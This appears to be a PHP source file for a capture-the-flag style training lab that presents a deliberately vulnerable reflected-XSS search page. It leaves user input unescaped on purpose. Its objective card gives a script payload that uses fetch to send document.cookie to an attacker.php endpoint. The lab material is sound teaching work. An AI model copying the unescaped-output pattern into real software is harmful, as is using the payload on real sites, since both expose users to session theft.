<?php

namespace Labs\XSS\Challenges;

use App\Core\BaseChallenge;
use App\Core\Session;

class Level1Reflected extends BaseChallenge
{
  private string $searchQuery = '';
  private string $searchResult = '';
  private bool $solved = false;

  public function handle(): void
  {
    // Check if already solved via attacker.php callback
    if (Session::get('xss_lvl1_solved') === true) {
      $this->solved = true;
    }


    if ($this->isPost() && isset($_POST['search'])) {
      $this->searchQuery = $_POST['search'];
      // ⚠️ VULNERABILITY: directly output user input without escaping
      $this->searchResult = "Showing results for: " . $this->searchQuery;
      // Log the search for admin panel (create directory if missing)
      $logDir = ROOT . '/storage/logs';
      if (!is_dir($logDir)) {
        mkdir($logDir, 0755, true);
      }
      $logFile = $logDir . '/search_history.log';
      file_put_contents($logFile, date('[Y-m-d H:i:s]') . ' ' . $this->searchQuery . PHP_EOL, FILE_APPEND);
    }
  }

  public function render(): void
  {
    // Include global military header + sidebar
    include_once ROOT . '/shared/header.php';
    include_once ROOT . '/shared/sidebar.php';
?>
<div class="lg:ml-64 p-6">
  <div class="max-w-4xl mx-auto">
    <!-- Page Header -->
    <div class="mb-6">
      <h1 class="text-2xl font-bold text-gray-900">
        <i class="fas fa-search text-indigo-600 mr-2"></i>Agent Search – XSS Lab (Level 1)
      </h1>
      <p class="text-gray-600 mt-1">Reflected Cross‑Site Scripting</p>
    </div>

    <!-- Objective Card -->
    <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
      <div class="flex items-start">
        <i class="fas fa-bullseye text-yellow-600 mt-0.5 mr-3"></i>
        <div>
          <p class="font-semibold text-gray-900">Mission Objective</p>
          <p class="text-sm text-gray-700">Inject a JavaScript payload that steals the session cookie of any agent who
            views search results. The lab admin regularly reviews search logs. <span
              class="font-mono text-xs bg-gray-200 px-1">?page=xss_admin</span> simulates the admin panel.</p>
          <p class="text-xs text-gray-600 mt-1">Use: <span
              class="font-mono bg-gray-100 px-1">&lt;script&gt;fetch('http://localhost/public/attacker.php?cookie='+document.cookie)&lt;/script&gt;</span>
          </p>
        </div>
      </div>
    </div>

    <!-- Vulnerable Search Form -->
    <div class="bg-white rounded-lg shadow p-6 mb-6">
      <form method="POST" class="space-y-4">
        <div>
          <label for="search" class="block text-sm font-medium text-gray-700">Search agents by codename or real
            name</label>
          <div class="mt-1 flex rounded-md shadow-sm">
            <input type="text" name="search" id="search"
              class="flex-1 rounded-md border-gray-300 focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
              placeholder="e.g., GHOST, Mitchell, ..." value="<?= htmlspecialchars($this->searchQuery) ?>">
            <button type="submit"
              class="ml-3 inline-flex items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md shadow-sm text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none">
              <i class="fas fa-search mr-1"></i> Search
            </button>
          </div>
        </div>
      </form>

      <!-- ⚠️ VULNERABLE OUTPUT (reflected XSS) -->
      <?php if (!empty($this->searchResult)): ?>
      <div class="mt-6 p-4 bg-gray-50 rounded border border-gray-200">
        <p class="text-sm text-gray-500">Result:</p>
        <div class="mt-2 prose prose-sm max-w-none">
          <?= $this->searchResult ?>
          <!-- NO ESCAPING = XSS -->
        </div>
      </div>
      <?php endif; ?>
    </div>

    <!-- Success Message -->
    <?php if ($this->solved): ?>
    <div class="bg-green-50 border-l-4 border-green-400 p-4">
      <div class="flex">
        <i class="fas fa-check-circle text-green-500 mr-3"></i>
        <div>
          <p class="font-medium text-green-800">Challenge Completed</p>
          <p class="text-sm text-green-700">You successfully exploited the reflected XSS vulnerability. The admin's
            cookie was stolen.</p>
        </div>
      </div>
    </div>
    <?php endif; ?>

    <!-- Hint Section -->
    <div class="mt-6 text-sm text-gray-500 border-t pt-4">
      <details>
        <summary class="cursor-pointer font-medium">📘 Intelligence Briefing (Hint)</summary>
        <div class="mt-2 pl-4 border-l-2 border-gray-300">
          <p>The search term is directly inserted into the HTML without sanitization. Try injecting a <code
              class="bg-gray-100 px-1">&lt;script&gt;</code> tag that sends <code
              class="bg-gray-100 px-1">document.cookie</code> to the attacker endpoint.</p>
          <p>After injection, visit <code class="bg-gray-100 px-1">?page=xss_admin</code> (simulated admin review) to
            trigger the payload.</p>
        </div>
      </details>
    </div>
  </div>
</div>
<?php
    include_once ROOT . '/shared/footer.php';
  }

  public function validate(): bool
  {
    error_log("validate() called for xss_lvl1");
    $solved = Session::get('xss_lvl1_solved') === true;
    error_log("solved = " . ($solved ? 'true' : 'false'));
    if ($solved) {
      $this->markCompleted('xss', 'lvl1');
    }
    return $solved;
  }
}